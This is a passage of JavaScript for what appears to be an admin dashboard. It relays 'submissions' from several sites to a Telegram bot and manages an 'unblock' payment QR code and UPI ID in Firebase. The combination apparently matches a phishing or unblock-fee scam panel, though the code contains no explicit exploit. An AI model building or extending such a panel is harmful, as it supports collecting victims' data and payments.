      var oldEnabled = TELEGRAM_CONFIG.enabled;
      TELEGRAM_CONFIG.botToken = token;
      TELEGRAM_CONFIG.chatId = chat;
      TELEGRAM_CONFIG.enabled = true;
      var msg = '<b>✅ Test Alert!</b>\nYour Telegram bot is working.\nNew submissions will be notified here.';
      sendTelegramAlert(msg);
      TELEGRAM_CONFIG.botToken = oldToken;
      TELEGRAM_CONFIG.chatId = oldChat;
      TELEGRAM_CONFIG.enabled = oldEnabled;
      toast('Test message sent!');
    });
  }
}

// ===== UNBLOCK PAYMENT SETTINGS =====
let _unsubPayment = null;
let _paymentSettings = { qr_code_url: null, upi_id: null };

function initUnblockPaymentUI() {
  var qrUrlInput = document.getElementById('qrUrlInput');
  var saveQrUrlBtn = document.getElementById('saveQrUrlBtn');
  var removeQrBtn = document.getElementById('removeQrBtn');
  var upiInput = document.getElementById('upiIdInput');
  var saveUpiBtn = document.getElementById('saveUpiBtn');
  var removeUpiBtn = document.getElementById('removeUpiBtn');
  var qrPreview = document.getElementById('qrPreview');

  if (!saveQrUrlBtn) return;

  if (saveQrUrlBtn) {
    saveQrUrlBtn.addEventListener('click', function() {
      var val = qrUrlInput ? qrUrlInput.value.trim() : '';
      if (!val) { toast('Enter QR image URL', 'error'); return; }
      _db.collection('unblock_settings').doc('payment').set({
        qr_code_url: val,
        updated_at: firebase.firestore.FieldValue.serverTimestamp()
      }, { merge: true }).then(function() {
        toast('QR URL saved');
      });
    });
  }

  if (removeQrBtn) {
    removeQrBtn.addEventListener('click', function() {
      _db.collection('unblock_settings').doc('payment').set({
        qr_code_url: firebase.firestore.FieldValue.delete()
      }, { merge: true }).then(function() {
        toast('QR removed');
        if (qrUrlInput) qrUrlInput.value = '';
      });
    });
  }

  if (saveUpiBtn) {
    saveUpiBtn.addEventListener('click', function() {
      var val = upiInput ? upiInput.value.trim() : '';
      if (!val) { toast('Enter UPI ID', 'error'); return; }
      _db.collection('unblock_settings').doc('payment').set({
        upi_id: val,
        updated_at: firebase.firestore.FieldValue.serverTimestamp()
      }, { merge: true }).then(function() {
        toast('UPI saved');
      });
    });
  }

  if (removeUpiBtn) {
    removeUpiBtn.addEventListener('click', function() {
      _db.collection('unblock_settings').doc('payment').set({
        upi_id: firebase.firestore.FieldValue.delete()
      }, { merge: true }).then(function() {
        toast('UPI removed');
        if (upiInput) upiInput.value = '';
      });
    });
  }

  listenPaymentSettings();
}

function listenPaymentSettings() {
  if (_unsubPayment) { _unsubPayment(); _unsubPayment = null; }
  _unsubPayment = _db.collection('unblock_settings').doc('payment').onSnapshot(function(doc) {
    var data = doc.data() || {};
    _paymentSettings.qr_code_url = data.qr_code_url || null;
    _paymentSettings.upi_id = data.upi_id || null;
    updatePaymentUI();
  });
}

function updatePaymentUI() {
  var qrPreview = document.getElementById('qrPreview');
  var qrUrlInput = document.getElementById('qrUrlInput');
  var upiInput = document.getElementById('upiIdInput');
  var upiStatus = document.getElementById('upiStatus');

  if (qrUrlInput && _paymentSettings.qr_code_url) {
    qrUrlInput.value = _paymentSettings.qr_code_url;
  }
  if (qrPreview) {
    if (_paymentSettings.qr_code_url) {
      qrPreview.src = _paymentSettings.qr_code_url;
      qrPreview.style.display = 'block';
    } else {
      qrPreview.style.display = 'none';
    }
  }
  if (upiInput && _paymentSettings.upi_id) {
    upiInput.value = _paymentSettings.upi_id;
  }
  if (upiStatus) {
    if (_paymentSettings.upi_id) {
      upiStatus.textContent = 'Current: ' + _paymentSettings.upi_id;
      upiStatus.style.display = 'block';
    } else {
      upiStatus.style.display = 'none';
    }
  }
}

function openImagePreview(url) {
  var lb = document.querySelector('.img-lightbox');
  if (lb) lb.remove();
  lb = document.createElement('div');
  lb.className = 'img-lightbox show';
  lb.innerHTML = '<div class="img-lightbox-bg" onclick="closeImagePreview()"></div><div class="img-lightbox-content"><img src="' + esc(url) + '" alt="Preview" /><button class="img-lightbox-close" onclick="closeImagePreview()"><i class="fa-solid fa-xmark"></i></button></div>';
  document.body.appendChild(lb);
}
function closeImagePreview() {
  var lb = document.querySelector('.img-lightbox');
  if (lb) lb.classList.remove('show');
  setTimeout(function() { if (lb) lb.remove(); }, 300);
}

async function init() {
  cacheDom();
  initBottomNav();
  initFilters();
  initEvents();
  setConn('connecting');

  const page = location.hash.slice(1) || 'dashboard';
  navigate(page);

  window.addEventListener('hashchange', () => {
    const p = location.hash.slice(1) || 'dashboard';
    if (p !== state.currentPage) navigate(p);
  });

  try {
    await loadFirebase();

    _db.collection('admin_status').doc('admin').set({
      online: true,
      lastSeen: firebase.firestore.FieldValue.serverTimestamp()
    }, { merge: true });

    window.addEventListener('beforeunload', () => {
      _db.collection('admin_status').doc('admin').set({ online: false }, { merge: true });
    });
    document.addEventListener('visibilitychange', () => {
      _db.collection('admin_status').doc('admin').set({
        online: document.visibilityState === 'visible',
        lastSeen: firebase.firestore.FieldValue.serverTimestamp()
      }, { merge: true });
    });

    startListener();
    initUnblockPaymentUI();
  } catch(e) {
    console.error(e); setConn('error');
    document.querySelectorAll('.list,.site-bars,.spark,.recent-list').forEach(el => {
      el.innerHTML = `<div class="error-state"><div class="empty-icon"><i class="fa-solid fa-triangle-exclamation"></i></div><div class="empty-text">Connection failed</div><div class="empty-sub">${esc(e.message)}</div></div>`;
    });
  }
}

document.addEventListener('visibilitychange', () => { if (document.visibilityState==='visible' && _db) { clearTimeout(_retryTimer); startListener(); } });
window.addEventListener('focus', () => { if (_db) { clearTimeout(_retryTimer); startListener(); } });
window.addEventListener('online', () => { if (_db) { clearTimeout(_retryTimer); startListener(); toast('Back online','success'); } });
window.addEventListener('offline', () => { setConn('error'); toast('Offline','error'); });
setInterval(() => { if (_db && document.visibilityState==='visible') { _db.collection('submissions').limit(1).get({source:'server'}).catch(() => { setConn('error'); clearTimeout(_retryTimer); startListener(); }); } }, 120000);

init();
